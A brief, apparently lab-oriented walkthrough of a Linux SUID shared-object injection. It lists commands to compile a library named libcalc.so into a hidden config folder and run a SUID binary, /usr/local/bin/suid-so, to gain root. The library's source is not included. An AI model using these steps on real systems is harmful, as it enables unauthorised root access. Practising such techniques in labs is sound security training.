# suid-_env

In command prompt type: mkdir /home/user/.config
In command prompt type: cd /home/user/.config
Open a text editor paste codes from libcalc.so or mv the libcalc.so to the .config folder
In command prompt type:
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
/usr/local/bin/suid-so

# Congrats you now have root
